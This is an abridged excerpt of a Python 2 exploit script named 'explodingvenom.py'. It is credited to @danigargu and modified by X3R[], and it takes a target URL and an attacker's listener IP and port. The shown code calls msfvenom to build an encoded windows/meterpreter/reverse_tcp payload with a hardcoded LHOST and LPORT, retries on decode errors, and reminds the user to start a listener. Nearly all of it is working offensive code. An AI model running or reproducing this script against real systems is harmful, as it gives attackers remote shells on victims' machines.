...
# by @danigargu
#
# Modified by X3R[] to persist through the 'utf16' codec can't decode error
#
# Syntax: python explodingvenom.py <target url> <IP of attacker's listener for reverse shell> <TCP Port of attacker's listener for reverse shell>
...
def main():    
    ...
    while goagain > 0: 
        try:
                if goagain > 1:
                    print
                    print "^^ 'Getting the 'utf16' codec can't decode' bollocks? ^^"
                    print "Don't worry, it's just a bad payload, hang in there and let's try that again!..."
                    print
                    print
                ...
                arg1 = "windows/meterpreter/reverse_tcp"
                arg2 = "raw"
                arg3 = "x86/alpha_mixed"
                arg4 = "LHOST=10.10.14.19"
                arg5 = "LPORT=4444"
 
                print
                print "I hope you remembered to set your listener up"
                print "Use windows/meterpreter/reverse_tcp as the payload type for your listener (or modify this script)"
                print
                print "Building payload, please wait..."                   
                subprocess.check_call(["msfvenom","-p",arg1,"-f",arg2,"-e",arg3,"LHOST=" + lhost,"LPORT=" + lport,"-o",sc_file])
